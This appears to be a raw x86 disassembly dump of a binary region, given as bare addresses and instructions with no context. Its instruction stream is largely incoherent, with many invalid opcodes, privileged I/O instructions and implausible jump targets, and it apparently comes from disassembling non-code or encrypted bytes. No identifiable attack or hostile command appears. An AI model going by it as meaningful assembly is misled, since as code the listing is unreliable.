  41b5be:	test   BYTE PTR [ecx+esi*1],dh
  41b5c1:	mov    esp,0x9ba6f322
  41b5c6:	lahf   
  41b5c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5c8:	std    
  41b5c9:	sub    al,0x9e
  41b5cb:	neg    BYTE PTR [ebp-0x25]
  41b5ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5cf:	sub    eax,0xa426a85f
  41b5d4:	mov    eax,ds:0x4578a104
  41b5d9:	fisttp QWORD PTR [edi]
  41b5db:	xor    eax,0x7fbeca37
  41b5e0:	scas   al,BYTE PTR es:[edi]
  41b5e1:	scas   al,BYTE PTR es:[edi]
  41b5e2:	dec    ebp
  41b5e3:	aad    0xc8
  41b5e5:	mov    al,0x19
  41b5e7:	(bad)  
  41b5e9:	popa   
  41b5ea:	pop    ds
  41b5eb:	pushf  
  41b5ec:	xchg   edx,eax
  41b5ed:	loope  0x41b598
  41b5ef:	xchg   ebx,eax
  41b5f0:	cmp    BYTE PTR [edx-0x5d],ah
  41b5f3:	push   ebx
  41b5f4:	xchg   esi,eax
  41b5f5:	ret    
  41b5f6:	push   ebx
  41b5f7:	mov    edi,0x30319757
  41b5fc:	pop    ebx
  41b5fd:	xor    bl,0xe8
  41b600:	push   ds
  41b601:	bound  esi,QWORD PTR [edx-0x21]
  41b604:	cmp    al,0xda
  41b606:	pushf  
  41b607:	adc    dl,ch
  41b609:	push   esi
  41b60a:	adc    DWORD PTR [edi+0x2bba544f],esp
  41b610:	push   0xfffffff8
  41b612:	jne    0x41b689
  41b614:	xor    DWORD PTR [edx+0x2a],0xc48fb05a
  41b61b:	xchg   esp,eax
  41b61c:	jb     0x41b606
  41b61e:	push   edi
  41b61f:	call   DWORD PTR [eax]
  41b621:	cmp    dh,BYTE PTR [eax+0x20aa1151]
  41b627:	lea    edi,[eax+0x481a821f]
  41b62d:	fisttp WORD PTR [edx]
  41b62f:	lods   al,BYTE PTR ds:[esi]
  41b630:	data16 fwait
  41b632:	rcr    DWORD PTR [ebx+edi*4-0x1a],0xf
  41b637:	scas   al,BYTE PTR es:[edi]
  41b638:	pop    ecx
  41b639:	inc    ecx
  41b63a:	(bad)  
  41b63c:	les    ebx,FWORD PTR [ecx]
  41b63e:	loope  0x41b632
  41b640:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b641:	dec    ecx
  41b642:	es popf 
  41b644:	jle    0x41b5c8
  41b646:	shl    BYTE PTR [esi+0x5fb09088],0xb
  41b64d:	mov    ch,0xe2
  41b64f:	xchg   esp,eax
  41b650:	out    0x19,eax
  41b652:	adc    dl,cl
  41b654:	stos   BYTE PTR es:[edi],al
  41b655:	adc    eax,DWORD PTR [eax+0x4c]
  41b658:	sub    dl,BYTE PTR [ebp-0x72]
  41b65b:	xchg   ebx,eax
  41b65c:	mov    ah,0xe
  41b65e:	push   esp
  41b660:	out    dx,al
  41b661:	dec    eax
  41b662:	in     eax,0x7
  41b664:	or     DWORD PTR [ecx-0x63b19048],esi
  41b66a:	inc    ebp
  41b66b:	js     0x41b618
  41b66d:	push   ebx
  41b66e:	lahf   
  41b66f:	mov    ecx,0xfe2176
  41b674:	imul   dh
  41b676:	cwde   
  41b677:	lahf   
  41b678:	mov    esp,esi
  41b67a:	or     eax,0x5388d055
  41b67f:	sub    al,0x76
  41b681:	pop    esp
  41b682:	rcl    ch,cl
  41b684:	jge    0x41b6e4
  41b686:	lods   al,BYTE PTR ds:[esi]
  41b687:	push   edx
  41b688:	stos   DWORD PTR es:[edi],eax
  41b689:	outs   dx,DWORD PTR ds:[esi]
  41b68a:	inc    edi
  41b68b:	jns    0x41b67c
  41b68d:	shl    ebx,1
  41b68f:	cmc    
  41b690:	and    al,0xe6
  41b692:	add    ch,BYTE PTR [edi]
  41b694:	pusha  
  41b695:	std    
  41b696:	lods   eax,DWORD PTR ds:[esi]
  41b697:	idiv   DWORD PTR [edx+0x5c3b296d]
  41b69d:	ret    0xd4f4
  41b6a0:	mov    edx,DWORD PTR es:[esi+0x4f]
  41b6a4:	test   eax,0xedadc221
  41b6a9:	mov    ds:0xeae32d3,eax
  41b6ae:	adc    DWORD PTR [edi+0x3fdeb3df],ebp
  41b6b4:	dec    esp
  41b6b5:	fldenv cs:[ebp-0xa]
  41b6b9:	clc    
  41b6ba:	pop    esp
  41b6bb:	or     al,0x47
  41b6bd:	or     dh,dl
  41b6bf:	repz imul esp,DWORD PTR [ecx+edx*8],0x46
  41b6c4:	neg    bl
  41b6c6:	imul   edi,DWORD PTR [edi-0x4095be19],0x35aa3eda
  41b6d0:	jl     0x41b67f
  41b6d2:	sahf   
  41b6d3:	sbb    al,0xf5
  41b6d5:	enter  0xff2b,0xb6
  41b6d9:	retf   
  41b6da:	jle    0x41b6d3
  41b6dc:	push   0xfb6b4ed4
  41b6e1:	mov    bl,0xb6
  41b6e3:	sub    BYTE PTR [esi-0x59],ah
  41b6e6:	dec    eax
  41b6e7:	pop    ss
  41b6e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6e9:	xchg   BYTE PTR [ebx-0x50],dh
  41b6ec:	lahf   
  41b6ed:	and    bl,bl
  41b6ef:	int3   
  41b6f0:	cmp    al,0x67
  41b6f2:	xchg   edx,eax
  41b6f3:	adc    DWORD PTR [edi],edx
  41b6f5:	mov    esp,ebp
  41b6f7:	outs   dx,DWORD PTR ds:[esi]
  41b6f8:	push   esi
  41b6f9:	jp     0x41b76f
  41b6fb:	lods   eax,DWORD PTR gs:[esi]
  41b6fd:	add    ch,0x82
  41b700:	mov    ecx,0xe3a41bb5
  41b705:	(bad)  
  41b706:	mov    edi,0x91962149
  41b70b:	push   es
  41b70c:	jbe    0x41b6da
  41b70e:	and    eax,0x9878a4c
  41b713:	inc    ecx
  41b714:	jnp    0x41b78a
  41b716:	sti    
  41b717:	stos   DWORD PTR es:[edi],eax
  41b718:	jb     0x41b6e4
  41b71a:	push   eax
  41b71b:	mov    ecx,0x9ccddfb4
  41b720:	sub    edx,DWORD PTR ds:0xea519b9
  41b726:	pop    ss
  41b727:	(bad)  
  41b728:	xor    bh,ch
  41b72a:	cmp    dh,bh
  41b72c:	nop
  41b72d:	(bad)  
  41b72e:	fimul  DWORD PTR [edx-0x29]
  41b731:	adc    eax,0xce957b65
  41b736:	enter  0xf784,0xe6
  41b73a:	dec    ebx
  41b73b:	daa    
  41b73c:	dec    esp
  41b73d:	cld    
  41b73e:	and    eax,0x114dbef
  41b743:	push   edi
  41b744:	leave  
  41b745:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b746:	out    0x9f,al
  41b748:	xchg   DWORD PTR [esi+0x6f],ebx
  41b74b:	imul   esi,ebp,0xffffffa5
  41b74e:	fucomip st,st(5)
  41b750:	imul   edx,DWORD PTR [edi],0xffffffcd
  41b753:	pop    ecx
  41b754:	xchg   edi,eax
  41b755:	xchg   edx,eax
  41b756:	enter  0x8096,0xf
  41b75a:	or     BYTE PTR [esi-0x2f],al
  41b75d:	lods   eax,DWORD PTR ds:[esi]
  41b75e:	into   
  41b75f:	pop    ecx
  41b760:	stos   DWORD PTR es:[edi],eax
  41b761:	sub    al,0x98
  41b763:	neg    DWORD PTR [ebx+esi*4+0x44330ab7]
  41b76a:	retf   
  41b76b:	clc    
  41b76c:	xor    BYTE PTR [edx-0x6cfa66a1],0x8b
  41b773:	ret    
  41b774:	in     al,dx
  41b775:	neg    edx
  41b777:	adc    eax,0x195ad4d0
  41b77c:	mov    cl,0x30
  41b77e:	adc    BYTE PTR [ebx],bh
  41b780:	add    bl,BYTE PTR ds:0xa0e4a2ca
  41b787:	inc    ebx
  41b788:	dec    esi
  41b789:	ret    
  41b78a:	sahf   
  41b78b:	leave  
  41b78c:	(bad)
  41b791:	sbb    eax,0x6248a973
  41b796:	jne    0x41b7ed
  41b798:	mov    ds:0x12a7d289,eax
  41b79d:	test   al,0xb2
  41b79f:	xchg   ecx,eax
  41b7a0:	and    DWORD PTR [esi-0x4b243201],edx
  41b7a6:	nop
  41b7a7:	inc    ebp
  41b7a8:	fist   DWORD PTR [ebp-0x12]
  41b7ab:	pop    esi
  41b7ac:	xchg   ecx,eax
  41b7ad:	push   edx
  41b7ae:	pop    ds
  41b7af:	sub    eax,0x7a74571
  41b7b4:	je     0x41b7b8
  41b7b6:	rcl    bh,1
  41b7b8:	mov    eax,0x5b4e03e8
  41b7bd:	inc    eax
  41b7be:	ficomp WORD PTR [eax+0x196e03b2]
  41b7c4:	push   ebp
  41b7c5:	sub    esi,DWORD PTR [ebx+0x9]
  41b7c8:	icebp  
  41b7c9:	mov    eax,0x70f8d5f2
  41b7ce:	cwde   
  41b7cf:	sub    ecx,eax
  41b7d1:	test   eax,0xaf38bc78
  41b7d6:	adc    eax,0xd0657865
  41b7db:	int    0x9
  41b7dd:	cmp    eax,0x40
  41b7e0:	aam    0xb4
  41b7e2:	mov    ecx,0x162fb734
  41b7e7:	or     BYTE PTR [ecx],ah
  41b7e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7ea:	or     al,0xd0
  41b7ec:	adc    DWORD PTR [ebx+0x500ff609],0xffffffaa
  41b7f3:	ret    0x3711
  41b7f6:	adc    dl,bh
  41b7f8:	add    al,0xdd
  41b7fa:	push   0x6b
  41b7fc:	mov    WORD PTR [edi],ds
  41b7fe:	xlat   BYTE PTR ds:[ebx]
  41b7ff:	pop    esp
  41b800:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b801:	jecxz  0x41b78e
  41b803:	out    dx,eax
  41b804:	outs   dx,DWORD PTR ds:[esi]
  41b805:	xchg   ebp,eax
  41b806:	or     eax,0x9851a45e
  41b80b:	adc    DWORD PTR [edx+0x5c848cde],edx
  41b811:	adc    ebx,DWORD PTR [edx]
  41b813:	jae    0x41b803
  41b815:	xchg   ebx,eax
  41b816:	out    0xf3,eax
  41b818:	pop    edx
  41b819:	inc    esp
  41b81a:	mov    dl,0x9f
  41b81c:	jp     0x41b856
  41b81e:	(bad)  
  41b81f:	mov    dh,BYTE PTR [esi-0x3d9e9ee0]
  41b825:	test   DWORD PTR [ecx-0x5d5705b8],edx
  41b82b:	push   cs
  41b82c:	jmp    DWORD PTR [ecx-0x53]
  41b82f:	push   esp
  41b830:	popa   
  41b831:	xor    cl,BYTE PTR [ebx]
  41b833:	inc    esp
  41b834:	pushf  
  41b835:	nop
  41b836:	(bad)  
  41b837:	fcomi  st,st(1)
  41b839:	mov    bh,0xd2
  41b83b:	std    
  41b83c:	ins    DWORD PTR es:[edi],dx
  41b83d:	shr    DWORD PTR [ebx],cl
  41b83f:	fld    TBYTE PTR [esp+ecx*2-0x21]
  41b843:	data16 lods al,BYTE PTR ds:[esi]
  41b845:	enter  0x90de,0x98
  41b849:	push   edi
  41b84a:	push   ebp
  41b84b:	mul    DWORD PTR [ecx+ebp*4]
  41b84e:	mov    dl,ah
  41b850:	dec    edx
  41b851:	cmp    bh,BYTE PTR [eax]
  41b853:	xor    edi,edx
  41b855:	adc    al,al
  41b857:	popa   
  41b858:	int    0x68
  41b85a:	dec    ebp
  41b85b:	aaa    
  41b85c:	mov    ah,BYTE PTR [eax+edi*4+0x7c]
  41b860:	xor    dl,BYTE PTR [edi]
  41b862:	push   es
  41b863:	dec    ebx
  41b864:	stos   BYTE PTR es:[edi],al
  41b865:	or     al,dh
  41b867:	cmp    al,BYTE PTR [ecx-0x3fe24ef8]
  41b86d:	xor    DWORD PTR [ebx],ecx
  41b86f:	pop    eax
  41b870:	clc    
  41b871:	mov    ds:0xd27f21c5,al
  41b876:	(bad)  
  41b877:	repz jg 0x41b8c9
  41b87a:	icebp  
  41b87b:	arpl   WORD PTR [eax],di
  41b87d:	dec    eax
  41b87e:	lods   eax,DWORD PTR ds:[esi]
  41b87f:	daa    
  41b880:	js     0x41b880
  41b882:	mov    WORD PTR [edx-0x6e012d5],ds
  41b888:	fild   DWORD PTR [ecx+edi*2+0x4e]
  41b88c:	fstp   QWORD PTR [edx+edi*8]
  41b88f:	ins    DWORD PTR es:[edi],dx
  41b890:	sub    bl,BYTE PTR [esi]
  41b892:	call   0xcb9:0x1ff1b4c5
  41b899:	data16 dec BYTE PTR [ecx]
  41b89c:	inc    eax
  41b89d:	lahf   
  41b89e:	mov    dl,0x63
  41b8a0:	jnp    0x41b866
  41b8a2:	mov    edx,0x4d681f6e
  41b8a7:	leave  
  41b8a8:	and    esp,DWORD PTR gs:[edx-0x471fdfbc]
  41b8af:	ja     0x41b871
  41b8b1:	or     al,0x28
  41b8b3:	sub    edi,esi
  41b8b5:	(bad)  
  41b8b6:	mov    esi,0xab2a36c1
  41b8bb:	lods   eax,DWORD PTR ds:[esi]
  41b8bc:	pop    ebp
  41b8bd:	test   cl,bl
  41b8bf:	add    DWORD PTR [edx+0x3d],edi
  41b8c2:	mov    al,0xa8
  41b8c4:	popf   
  41b8c5:	addr16 into 
  41b8c7:	fs xchg ebp,eax
  41b8c9:	repz pop ss
  41b8cb:	in     al,0xbe
  41b8cd:	mov    BYTE PTR [esi],ch
  41b8cf:	xchg   edi,eax
  41b8d0:	and    esi,DWORD PTR [edi+edx*8+0x69]
  41b8d4:	push   es
  41b8d5:	jnp    0x41b94f
  41b8d7:	sbb    ebx,DWORD PTR [ecx-0x3d8a23b3]
  41b8dd:	mov    esi,0xa0861d0d
  41b8e2:	jmp    0xcedfb357
  41b8e7:	rol    DWORD PTR [ebp+0x1bada61c],cl
  41b8ed:	add    eax,0x30fd6d4e
  41b8f2:	in     al,dx
  41b8f3:	je     0x41b926
  41b8f5:	lods   eax,DWORD PTR ds:[esi]
  41b8f6:	hlt    
  41b8f7:	into   
  41b8f8:	mov    esi,0xa2bbab1f
  41b8fd:	outs   dx,BYTE PTR ds:[esi]
  41b8fe:	inc    eax
  41b8ff:	add    DWORD PTR [eax-0x34],0xffffffc5
  41b903:	imul   esp,edi,0x32
  41b906:	ja     0x41b8ee
  41b908:	fwait
  41b909:	jl     0x41b943
  41b90b:	je     0x41b95a
  41b90d:	add    BYTE PTR [esp+eax*1-0x7a],bl
  41b911:	out    0x6a,al
  41b913:	adc    edi,DWORD PTR [ebp+0x0]
	...
  41b91e:	add    BYTE PTR [eax],al
  41b920:	add    BYTE PTR ds:0x7fd60e68,dl
  41b926:	neg    ch
  41b928:	jmp    0x41b991
  41b92a:	cli    
  41b92b:	and    BYTE PTR [esi+0x3d],ah
  41b92e:	push   edx
  41b92f:	es xchg edx,eax
  41b931:	sbb    DWORD PTR [esi],esi
  41b933:	add    DWORD PTR [eax],eax
  41b935:	lods   al,BYTE PTR ds:[esi]
  41b936:	add    eax,DWORD PTR [eax]
  41b938:	add    BYTE PTR [edi],ch
  41b93a:	sub    ch,BYTE PTR ds:0x3cdac42b
  41b940:	cli    
  41b941:	out    0x2e,eax
  41b943:	xor    cl,dl
  41b945:	gs cs paddsb mm3,mm3
  41b94a:	mov    edx,0x2f717666
  41b94f:	xor    BYTE PTR [ebp+edi*4-0x17],0x21
  41b954:	scas   eax,DWORD PTR es:[edi]
  41b955:	idiv   DWORD PTR [ecx+0x35851620]
  41b95b:	or     al,0x30
  41b95d:	mov    dh,0x35
  41b95f:	rcr    DWORD PTR [edx+0x21],1
  41b962:	mov    dh,0xcc
  41b964:	scas   al,BYTE PTR es:[edi]
  41b965:	xchg   BYTE PTR [edi+0x174e1977],dl
  41b96b:	pop    ebx
  41b96c:	cmp    dl,BYTE PTR [eax-0x24511413]
  41b972:	mov    ah,0xb9
  41b974:	imul   ecx,DWORD PTR [ebx+0x111e0eaf],0x6ca0a3dd
  41b97e:	adc    DWORD PTR [edx-0x5ef83b3d],ebp
  41b984:	neg    ecx
  41b986:	and    BYTE PTR [esi-0x1f5150a5],0x88
  41b98d:	popf   
  41b98e:	mov    edx,0xd0bdcb8a
  41b993:	add    eax,0x119b7e8c
  41b998:	clc    
  41b999:	lds    ecx,FWORD PTR [edx-0x7828ed1a]
  41b99f:	xor    esi,DWORD PTR [esi+0x32]
  41b9a2:	mov    ds:0x59d96606,eax
  41b9a7:	sbb    edx,DWORD PTR [edx-0x75]
  41b9aa:	and    eax,0x9149c802
  41b9af:	mov    ds:0x5e1f42f5,al
  41b9b4:	jge    0x41b9e1
  41b9b6:	jno    0x41b978
  41b9b8:	lea    ebp,[edx-0x1cadc0f7]
  41b9be:	xchg   esp,eax
  41b9bf:	hlt    
  41b9c0:	pop    esi
  41b9c2:	test   eax,0x899a6ae3
  41b9c7:	or     DWORD PTR [eax],edi
  41b9c9:	jl     0x41b9a2
  41b9cb:	je     0x41b9a7
  41b9cd:	adc    eax,0x8e6143a5
  41b9d2:	pop    ecx
  41b9d3:	cwde   
  41b9d4:	fcom   DWORD PTR ds:0xe9db8dca
  41b9da:	xor    DWORD PTR [ebx-0x4bd23831],0x7a
  41b9e1:	scas   eax,DWORD PTR es:[edi]
  41b9e2:	inc    esp
  41b9e3:	jge    0x41b9c4
  41b9e5:	fcomp  QWORD PTR [eax+0x781e9173]
  41b9eb:	mov    dh,0x1b
  41b9ed:	push   eax
  41b9ee:	jmp    0x41b9b7
  41b9f0:	cmp    dl,al
  41b9f2:	imul   edi,DWORD PTR [ecx+0x66],0xfffffff6
  41b9f6:	xchg   ebp,eax
  41b9f7:	ins    DWORD PTR es:[edi],dx
  41b9f8:	mov    al,0x76
  41b9fa:	shl    BYTE PTR [edi],0x6
  41b9fd:	pop    eax
  41b9fe:	jbe    0x41ba04
  41ba00:	pop    ebx
  41ba01:	sbb    dl,BYTE PTR [ecx]
  41ba03:	pop    ecx
  41ba04:	fistp  DWORD PTR [edx+ebp*4]
  41ba07:	mov    WORD PTR [eax-0x5e],cs
  41ba0a:	std    
  41ba0b:	shl    DWORD PTR ds:0xc0ff8a95,1
  41ba11:	mov    edx,0x42611b61
  41ba16:	add    eax,0x3ca32246
  41ba1b:	mov    WORD PTR [edx-0xe],ss
  41ba1e:	cmp    esi,DWORD PTR ss:[ebp+0x35]
  41ba22:	out    0x18,eax
  41ba24:	in     al,0x81
  41ba26:	push   ss
  41ba27:	sbb    al,0x17
  41ba29:	dec    edi
  41ba2a:	mov    ds:0x63087a76,al
  41ba2f:	popf   
  41ba30:	hlt    
  41ba31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba32:	in     al,dx
  41ba33:	mov    cl,0xff
  41ba35:	(bad)  
  41ba36:	fimul  WORD PTR [edx-0x3747c687]
  41ba3c:	pop    es
  41ba3d:	lahf   
  41ba3e:	jle    0x41b9c9
  41ba40:	in     al,0xa6
  41ba42:	fst    st(5)
  41ba44:	and    DWORD PTR [esi],ecx
  41ba46:	loopne 0x41ba2d
  41ba48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba49:	(bad)  
  41ba4a:	lods   al,BYTE PTR ds:[esi]
  41ba4b:	push   esi
  41ba4c:	dec    ecx
  41ba4d:	ds push esp
  41ba4f:	push   ds
  41ba50:	cmp    al,0xe3
  41ba52:	sbb    ebx,DWORD PTR [edi+0x31aba4e9]
  41ba58:	sbb    BYTE PTR ss:[edx-0x30],ah
  41ba5c:	shr    ah,1
  41ba5e:	push   ebp
  41ba5f:	rol    edx,0x92
  41ba62:	out    0x97,eax
  41ba64:	xor    edx,DWORD PTR [esi+edi*1-0x284ae50c]
  41ba6b:	mov    esi,DWORD PTR [ebx+0x213455e5]
  41ba71:	aad    0x40
  41ba73:	xchg   edx,eax
  41ba74:	push   es
  41ba75:	push   cs
  41ba76:	hlt    
  41ba77:	icebp  
  41ba78:	mov    ebx,0xd41c22b6
  41ba7d:	ins    DWORD PTR es:[edi],dx
  41ba7e:	mov    al,0xd
  41ba80:	shl    cl,0xd2
  41ba83:	xor    BYTE PTR [esp+eax*4+0x6b],dl
  41ba87:	adc    ebx,DWORD PTR [ecx+0x59]
  41ba8a:	ret    0x51d0
  41ba8d:	or     DWORD PTR [eax],edx
  41ba8f:	stos   BYTE PTR es:[edi],al
  41ba90:	aam    0xe4
  41ba92:	push   0x34792ef5
  41ba97:	js     0x41ba1e
  41ba99:	push   cs
  41ba9a:	je     0x41ba24
  41ba9c:	push   esp
  41ba9d:	push   0xb1235020
  41baa2:	jae    0x41ba68
  41baa4:	retf   0x83da
  41baa7:	lods   al,BYTE PTR ds:[esi]
  41baa8:	jns    0x41bacc
  41baaa:	mov    si,0x2417
  41baae:	retf   
  41baaf:	adc    DWORD PTR [edx],esi
  41bab1:	call   0x8f5ecc3a
  41bab6:	ror    DWORD PTR [ecx],cl
  41bab8:	arpl   WORD PTR [eax+eax*4+0x54b8dfeb],bx
  41babf:	pop    es
  41bac0:	jno    0x41bb3d
  41bac2:	test   al,al
  41bac4:	cmp    eax,DWORD PTR [edx]
  41bac6:	mov    bl,0xb9
  41bac8:	cdq    
  41bac9:	out    0x0,al
  41bacb:	cmp    ebx,DWORD PTR [ecx+0x44]
  41bace:	fsub   QWORD PTR [ecx]
  41bad0:	ins    DWORD PTR es:[edi],dx
  41bad1:	add    esi,edx
  41bad3:	lds    edx,FWORD PTR [edi+0x3160cfdd]
  41bad9:	ret    
  41bada:	jnp    0x41bb00
  41badc:	and    edi,DWORD PTR [ecx+edx*1+0x1e]
  41bae0:	mov    ecx,0xf8adeb88
  41bae5:	or     al,0x16
  41bae7:	fs scas al,BYTE PTR es:[edi]
  41bae9:	cmp    BYTE PTR [esi-0x3097245c],ah
  41baef:	mov    bl,0x92
  41baf1:	sbb    DWORD PTR [ecx+0xe59b269],ebx
  41baf7:	in     eax,0x4c
  41baf9:	adc    eax,0x6818587b
  41bafe:	mov    ch,0x88
  41bb00:	jmp    0xb1992940
  41bb05:	mov    al,BYTE PTR [edx-0x2d65bf01]
  41bb0b:	push   eax
  41bb0c:	jno    0x41bb6b
  41bb0e:	sti    
  41bb0f:	pop    esp
  41bb10:	inc    edx
  41bb11:	cdq    
  41bb12:	pusha  
  41bb13:	cmp    BYTE PTR [ecx+edi*8+0x66],bl
  41bb17:	repz adc eax,DWORD PTR [edi]
  41bb1a:	and    BYTE PTR [ebx-0x15a89e76],0xcb
  41bb21:	push   ds
  41bb22:	dec    esi
  41bb23:	jnp    0x41bb57
  41bb25:	xlat   BYTE PTR ds:[ebx]
  41bb27:	lods   eax,DWORD PTR ds:[esi]
  41bb28:	ins    BYTE PTR es:[edi],dx
  41bb29:	das    
  41bb2a:	jnp    0x41bb4f
  41bb2c:	ins    BYTE PTR es:[edi],dx
  41bb2d:	pop    es
  41bb2e:	sti    
  41bb2f:	cld    
  41bb30:	pop    ecx
  41bb31:	retf   
  41bb32:	in     eax,0xd3
  41bb34:	retf   0xe830
  41bb37:	js     0x41bb8c
  41bb39:	cmp    DWORD PTR [esi],esp
  41bb3b:	jle    0x41bb91
  41bb3d:	aaa    
  41bb3e:	add    al,0x9c
  41bb40:	out    0xa1,al
  41bb42:	call   0xdd5e:0x557a0622
  41bb49:	addr16 pop esp
  41bb4b:	ss loopne 0x41badd
  41bb4e:	fld    QWORD PTR [edx+0x7b]
  41bb51:	pop    DWORD PTR [edi]
  41bb53:	je     0x41bbc0
  41bb55:	outs   dx,DWORD PTR ds:[esi]
  41bb56:	imul   ebp,DWORD PTR [edx],0x14805d7
  41bb5c:	test   DWORD PTR [esi+0xf],ebx
  41bb5f:	popa   
  41bb60:	xor    DWORD PTR [esi+0x61],0x9bc68c15
  41bb67:	gs jnp 0x41bb4f
  41bb6a:	pop    ebx
  41bb6b:	and    DWORD PTR [edi-0xc],ecx
  41bb6e:	pop    ds
  41bb6f:	retf   0xb35
  41bb72:	call   0xef43:0xe9f3d008
  41bb79:	int    0xb8
  41bb7b:	sub    bl,BYTE PTR [esi+0x61a73b9b]
  41bb81:	xlat   BYTE PTR ds:[ebx]
  41bb82:	sahf   
  41bb83:	fld    st(1)
  41bb85:	in     eax,0x3
  41bb87:	(bad)  
  41bb88:	sbb    DWORD PTR [edx+0x35ee193a],ecx
  41bb8e:	call   edi
  41bb90:	fsub   st(6),st
  41bb92:	add    DWORD PTR [edx+0x11d3c928],ebp
  41bb98:	adc    eax,0xc3850d47
  41bb9d:	and    al,0x7c
  41bb9f:	(bad)  
  41bba0:	jno    0x41bc0b
  41bba2:	repnz xchg edx,eax
  41bba4:	fs push ds
  41bba6:	xchg   esi,eax
  41bba7:	pop    es
  41bba8:	push   ecx
  41bba9:	pop    ss
  41bbaa:	jp     0x41bb3c
  41bbac:	xor    ebx,DWORD PTR [esi+ebx*1]
  41bbaf:	mov    ?,WORD PTR [ecx]
  41bbb1:	outs   dx,BYTE PTR ds:[esi]
  41bbb2:	(bad)  [esi+0x3d]
  41bbb5:	cli    
  41bbb6:	cmp    DWORD PTR [ebp+0x16],esp
  41bbb9:	fwait
  41bbba:	push   edx
  41bbbb:	gs push eax
  41bbbd:	mov    al,ds:0xbf462d8a
  41bbc2:	jmp    0x41bb77
  41bbc4:	popa   
  41bbc5:	loop   0x41bb84
  41bbc7:	xor    al,0x0
  41bbc9:	or     eax,0xf48afac8
  41bbce:	adc    ah,BYTE PTR [ebp-0x61fe6ac7]
  41bbd4:	les    ecx,FWORD PTR [ebp+0xd629619]
  41bbda:	jecxz  0x41bbbe
  41bbdc:	xchg   ebp,eax
  41bbdd:	push   cs
  41bbde:	dec    esi
  41bbdf:	(bad)  
  41bbe0:	pop    ebp
  41bbe1:	or     al,0x2f
  41bbe3:	and    al,BYTE PTR ds:[edx+0x28ca7457]
  41bbea:	mov    esi,edi
  41bbec:	test   al,0x90
  41bbee:	stos   BYTE PTR es:[edi],al
  41bbef:	and    DWORD PTR [edi],ebx
  41bbf1:	out    dx,eax
  41bbf2:	loop   0x41bbc9
  41bbf4:	add    al,0xa4
  41bbf6:	cmp    edx,0xf5c2cce0
  41bbfc:	adc    bl,BYTE PTR [eax-0x7a]
  41bbff:	sar    BYTE PTR [edx],0xea
  41bc02:	enter  0x6a1,0x5
  41bc06:	das    
  41bc07:	repnz popf 
  41bc09:	pop    ecx
  41bc0a:	jl     0x41bc56
  41bc0c:	pop    edx
  41bc0d:	pop    esi
  41bc0e:	cmp    DWORD PTR [ebx],ecx
  41bc10:	dec    ecx
  41bc11:	and    eax,0xba4ee2dc
  41bc16:	push   0xfffffff9
  41bc18:	cwde   
  41bc19:	ss int 0xdc
  41bc1c:	mov    bh,0xe7
  41bc1e:	addr16 inc ecx
  41bc20:	cmp    al,BYTE PTR [ebp+0x517b3044]
  41bc26:	mov    BYTE PTR [ebp+0x4ddf785a],ah
  41bc2c:	aad    0x6
  41bc2e:	inc    edi
  41bc2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc30:	mov    BYTE PTR [eax-0x3d],bh
  41bc33:	sbb    dh,BYTE PTR [ecx-0x322478dc]
  41bc39:	push   ebx
  41bc3a:	popa   
  41bc3b:	xchg   BYTE PTR [edx+0x4e489245],ah
  41bc41:	and    DWORD PTR [edi+ecx*1+0x45701fd5],edi
  41bc48:	imul   esp,DWORD PTR [edi-0xd6edcc0],0x5
  41bc4f:	fstp   QWORD PTR cs:[ebp-0x11]
  41bc53:	cmp    ebp,DWORD PTR [eax+ecx*1]
  41bc56:	push   ds
  41bc57:	sub    al,0x9d
  41bc59:	dec    ebx
  41bc5a:	mov    ds,WORD PTR [ebp-0x15798d2b]
  41bc60:	clc    
  41bc61:	xor    esi,ecx
  41bc63:	push   ss
  41bc64:	sbb    BYTE PTR [edi+0x3d],cl
  41bc67:	test   eax,0x8bcc4625
  41bc6c:	mov    edi,0xeb999686
  41bc71:	pop    eax
  41bc72:	(bad)  
  41bc73:	mov    ah,0x29
  41bc75:	xchg   edi,eax
  41bc76:	jmp    0x79497d5
  41bc7b:	in     al,dx
  41bc7c:	mov    WORD PTR [bx+di],?
  41bc7f:	mov    al,0x37
  41bc81:	mov    eax,0xdb18c552
  41bc86:	retf   0x7a12
  41bc89:	jp     0x41bccf
  41bc8b:	nop
  41bc8c:	idiv   BYTE PTR [edi-0x28]
  41bc8f:	jl     0x41bc90
  41bc91:	hlt    
  41bc92:	xor    BYTE PTR [ebx+esi*1],al
  41bc95:	hlt    
  41bc96:	mov    ebp,0xb21dadf6
  41bc9b:	add    ah,BYTE PTR ds:0x5f962c06
  41bca2:	xor    bl,ch
  41bca4:	pop    edi
  41bca5:	ret    
  41bca6:	daa    
  41bca7:	mov    eax,ds:0x80bebe1e
  41bcac:	lds    ebp,FWORD PTR [ecx+0x26bb90c5]
  41bcb2:	lock pop ecx
  41bcb4:	add    DWORD PTR [ebx+0x3fdd836a],ebx
  41bcba:	inc    ebx
  41bcbb:	add    cl,bl
  41bcbd:	jbe    0x41bcda
  41bcbf:	push   ds
  41bcc0:	dec    esi
  41bcc1:	jo     0x41bd0c
  41bcc3:	sbb    al,0x8b
  41bcc5:	push   ss
  41bcc6:	mov    dl,0x18
  41bcc8:	mov    al,ds:0x4c0d59da
  41bccd:	fcmovbe st,st(3)
  41bccf:	push   es
  41bcd0:	push   edx
  41bcd1:	pop    esp
  41bcd2:	lahf   
  41bcd3:	sub    BYTE PTR [ecx-0x4ff061fd],al
  41bcd9:	mov    es,WORD PTR [eax-0x1b066065]
  41bcdf:	dec    ebx
  41bce0:	sbb    eax,DWORD PTR [esi]
  41bce2:	leave  
  41bce3:	adc    BYTE PTR [edi+0x0],bh
	...
  41bcf1:	cld    
  41bcf2:	mov    WORD PTR [ebx+edx*8-0x5000040c],?
  41bcf9:	and    al,0xd
  41bcfb:	jmp    0x41bd54
  41bcfd:	mov    BYTE PTR [edx],ah
  41bcff:	sahf   
  41bd00:	cmp    ch,al
  41bd02:	cmp    DWORD PTR [ecx],eax
  41bd04:	add    BYTE PTR [ebx+eax*1-0x4f590000],ch
  41bd0b:	xor    al,0xec
